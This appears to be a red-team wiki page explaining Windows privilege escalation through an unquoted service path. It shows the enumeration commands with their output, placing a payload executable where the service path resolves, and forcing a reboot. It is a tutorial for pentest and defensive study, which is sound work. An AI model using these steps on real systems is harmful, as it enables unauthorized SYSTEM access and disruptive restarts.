---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/unquoted-service-paths
---

# Unquoted Service Paths

## Enumeration

Manual enumerate with wmic

```powershell
C:\>wmic service get name, pathname | findstr /i /v system32 | findstr /v \"
Name                                      PathName

LSM

NetSetupSvc

NetTcpPortSharing                         C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe

PerfHost                                  C:\WINDOWS\SysWow64\perfhost.exe

PSEXESVC                                  C:\WINDOWS\PSEXESVC.exe

TrustedInstaller                          C:\WINDOWS\servicing\TrustedInstaller.exe

VulnService                               C:\Setup\Vuln Service\VulnService.exe
```

Use SC command for enumerating with the Service Control Manager and services.

```powershell
C:\>sc qc vulnservice
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vulnservice
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Setup\Vuln Service\VulnService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VulnService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:

```powershell
C:\>icacls "C:\Setup\Vuln Service"
C:\Setup\Vuln Service BUILTIN\Administrators:(I)(OI)(CI)(F)
                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                      BUILTIN\Users:(I)(OI)(CI)(RX)
                      NT AUTHORITY\Authenticated Users:(I)(M)
                      NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

The system tries to interpret the possibilities in the following order:

1. **c:\program.exe**
2. **c:\program files\sub.exe**
3. **c:\program files\sub dir\program.exe**
4. **c:\program files\sub dir\program name.exe**

We can abuse this service by generating a payload named **'Vuln.exe'.**

```powershell
C:\Setup>dir
 Volume in drive C has no label.
 Volume Serial Number is CCA5-4541

 Directory of C:\Setup

04/06/2024  08:31 PM    <DIR>          .
04/06/2024  08:10 PM    <DIR>          Vuln Service
04/06/2024  08:31 PM             7,168 Vuln.exe
               1 File(s)          7,168 bytes
               2 Dir(s)  37,306,687,488 bytes free
```

Once the service gets restarted, your payload should execute.&#x20;

```powershell
C:\Setup>sc stop "VulnService"
[SC] OpenService FAILED 5:

Access is denied.
```

We may restart the service or the machine if we lack permission to stop the service.

```powershell
C:\> shutdown /r /t 0
```

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
